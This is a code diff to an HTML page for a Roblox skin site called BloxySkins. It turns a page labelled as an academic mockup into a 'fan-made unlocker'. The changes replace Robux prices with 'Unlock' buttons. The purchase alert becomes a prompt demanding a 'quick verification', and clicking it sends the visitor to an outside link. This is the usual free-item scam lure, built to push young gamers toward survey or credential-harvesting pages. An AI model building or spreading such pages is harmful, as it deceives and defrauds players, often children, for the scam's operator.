@@ -144,7 +144,7 @@
     <div>
         <h2>Las mejores skins para Roblox</h2>
         <p>Personaliza tu avatar con skins exclusivas, épicas y legendarias.
-           Compra rápido, fácil y seguro en BloxySkins.</p>
+           Desbloquea rápido, fácil y seguro en BloxySkins.</p>
         <button onclick="scrollSkins()">Ver Skins</button>
     </div>
 </section>
@@ -156,35 +156,42 @@
         <div class="skin-card">
             <img src="https://via.placeholder.com/300x200?text=Skin+Legendaria" alt="Skin">
             <h4>Skin Legendaria</h4>
-            <div class="price">500 Robux</div>
-            <button onclick="buySkin('Skin Legendaria')">Comprar</button>
+            <div class="price">Legendary Skin</div>
+            <button onclick="buySkin('Legendary Skin')">Unlock</button>
         </div>
 
         <div class="skin-card">
             <img src="https://via.placeholder.com/300x200?text=Skin+Épica" alt="Skin">
             <h4>Skin Épica</h4>
-            <div class="price">300 Robux</div>
-            <button onclick="buySkin('Skin Épica')">Comprar</button>
+            <div class="price">Legendary Skin</div>
+            <button onclick="buySkin('Legendary Skin')">Unlock</button>
         </div>
 
         <div class="skin-card">
             <img src="https://via.placeholder.com/300x200?text=Skin+Rara" alt="Skin">
             <h4>Skin Rara</h4>
-            <div class="price">150 Robux</div>
-            <button onclick="buySkin('Skin Rara')">Comprar</button>
+            <div class="price">Legendary Skin</div>
+            <button onclick="buySkin('Legendary Skin')">Unlock</button>
         </div>
     </div>
 </section>
 
 <footer>
-    © 2025 <span>BloxySkins</span> | Maqueta académica – No afiliado a Roblox
+   © 2025 <span>BloxySkins</span> | Fan-made unlocker. Not affiliated with Roblox.
 </footer>
 
 <script>
     function buySkin(skin) {
-        alert("Has seleccionado: " + skin + "\n\n⚠️ Esta es una maqueta, no se realiza compra real.");
-    }
+        const confirmUnlock = confirm(
+            "🔓 UNLOCK " + skin + "\n\n" +
+            "To unlock this premium skin you must complete a quick verification.\n\n" +
+            "Click OK to continue."
+        );
 
+        if (confirmUnlock) {
+            window.location.href = "https://doctoredits.com/1862659";
+        }
+    }
     function login() {
         alert("Inicio de sesión simulado.");
     }
